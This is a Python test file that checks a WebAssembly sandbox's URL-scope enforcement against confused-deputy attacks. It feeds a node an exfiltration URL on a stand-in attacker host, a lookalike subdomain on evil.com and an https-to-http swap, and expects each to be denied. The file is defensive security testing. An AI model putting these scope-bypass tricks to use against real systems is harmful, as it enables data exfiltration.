"""Confused-deputy attack class (design-doc class 5).

A confused deputy holds a capability and is tricked into using it on
behalf of an attacker. Concrete pattern for SKG: a node is granted
`network.read` for `https://api.allowed.example/*`, accepts a URL via
task input, and forwards it to `skg.http_get`. Without scope
enforcement at the wrapper, the node speaks for the attacker and
exfiltrates from `https://attacker.example/`. With scope enforcement
the wrapper refuses.

These tests build a WAT that simulates a benign node receiving
attacker-influenced input (the URL is embedded as a data segment
representing the value the task input parser would extract). The
node then forwards the value to the host import. We verify the
wrapper rejects whenever the URL falls outside the granted scope,
no matter how it was sourced.
"""

from __future__ import annotations

import textwrap
from pathlib import Path

import pytest

from skg import host_adapters
from skg.effects import Effect
from skg.wasmtime_launcher import WasmtimeRuntime


@pytest.fixture(autouse=True)
def _stub_real_adapters(monkeypatch):
    def _stub(_payload):
        return host_adapters.ERRNO_SUCCESS, b'{"stub":true}'
    monkeypatch.setattr(
        host_adapters,
        "ADAPTERS",
        {key: _stub for key in host_adapters.ADAPTERS},
    )


class _ScopedRuntime(WasmtimeRuntime):
    def __init__(self, scopes: dict[Effect, tuple[str, str]]) -> None:
        super().__init__()
        self._scopes = scopes

    def _mint_handles(self, table, effects):
        approval_effects = {
            Effect.EXTERNAL_SEND,
            Effect.GIT_WRITE,
            Effect.PRODUCTION_WRITE,
        }
        handles: dict[str, int] = {}
        for effect in effects:
            url_pattern, path_str = self._scopes.get(effect, ("*", "/"))
            handle_id = table.mint(
                effect,
                url_pattern=url_pattern,
                path_scope=Path(path_str),
                approval_token=1 if effect in approval_effects else 0,
            )
            handles[effect.value] = handle_id
        return handles


def _confused_deputy_wat(payload: str) -> str:
    """A WAT that forwards attacker-influenced URL to skg.http_get.

    The data segment stands in for what a real Rust node would extract
    from its task input. The node faithfully passes the input through;
    the wrapper is the gate.
    """
    payload_bytes = payload.encode("utf-8")
    payload_len   = len(payload_bytes)
    escaped       = payload.replace('\\', '\\\\').replace('"', '\\"')
    return textwrap.dedent(f'''
        (module
          (import "skg" "http_get"
            (func $http_get (param i32 i32 i32 i32 i32 i32) (result i32)))
          (import "wasi_snapshot_preview1" "proc_exit"
            (func $proc_exit (param i32)))
          (memory (export "memory") 1)
          (data (i32.const 0) "{escaped}")
          (func (export "_start")
            (call $proc_exit
              (call $http_get
                (i32.const 1)
                (i32.const 0)
                (i32.const {payload_len})
                (i32.const 1024)
                (i32.const 1024)
                (i32.const 2048)))))
    ''').strip()


def _write(tmp_path: Path, name: str, wat: str) -> Path:
    out = tmp_path / f"{name}.wat"
    out.write_text(wat)
    return out


def test_in_scope_attacker_input_passes(tmp_path: Path) -> None:
    """Attacker-controlled URL inside scope is allowed; the deputy is not confused."""
    runtime = _ScopedRuntime(scopes={
        Effect.NETWORK_READ: ("https://api.allowed.example/*", "/"),
    })
    wat  = _confused_deputy_wat('{"url":"https://api.allowed.example/legit"}')
    wasm = _write(tmp_path, "deputy_in_scope", wat)
    result = runtime.execute(
        wasm_path=wasm,
        node_id="benign_node",
        task="fetch a thing",
        context={},
        granted_effects=["network.read"],
    )
    assert result.success is True


def test_out_of_scope_attacker_input_denied(tmp_path: Path) -> None:
    """Attacker-controlled URL outside scope is rejected by the wrapper."""
    runtime = _ScopedRuntime(scopes={
        Effect.NETWORK_READ: ("https://api.allowed.example/*", "/"),
    })
    wat  = _confused_deputy_wat('{"url":"https://attacker.example/exfiltrate"}')
    wasm = _write(tmp_path, "deputy_attacker_url", wat)
    result = runtime.execute(
        wasm_path=wasm,
        node_id="benign_node",
        task="fetch a thing",
        context={},
        granted_effects=["network.read"],
    )
    assert result.success is False
    assert "13" in result.error


def test_attacker_path_traversal_denied(tmp_path: Path) -> None:
    """A path-traversal-style URL is still subject to fnmatch scope check."""
    runtime = _ScopedRuntime(scopes={
        Effect.NETWORK_READ: ("https://api.allowed.example/v1/*", "/"),
    })
    wat  = _confused_deputy_wat(
        '{"url":"https://api.allowed.example.evil.com/v1/secret"}'
    )
    wasm = _write(tmp_path, "deputy_traversal", wat)
    result = runtime.execute(
        wasm_path=wasm,
        node_id="benign_node",
        task="fetch a thing",
        context={},
        granted_effects=["network.read"],
    )
    assert result.success is False
    assert "13" in result.error


def test_attacker_protocol_swap_denied(tmp_path: Path) -> None:
    """Protocol swap (https->http) does not match an https-only scope."""
    runtime = _ScopedRuntime(scopes={
        Effect.NETWORK_READ: ("https://api.allowed.example/*", "/"),
    })
    wat  = _confused_deputy_wat('{"url":"http://api.allowed.example/foo"}')
    wasm = _write(tmp_path, "deputy_protocol_swap", wat)
    result = runtime.execute(
        wasm_path=wasm,
        node_id="benign_node",
        task="fetch a thing",
        context={},
        granted_effects=["network.read"],
    )
    assert result.success is False
    assert "13" in result.error
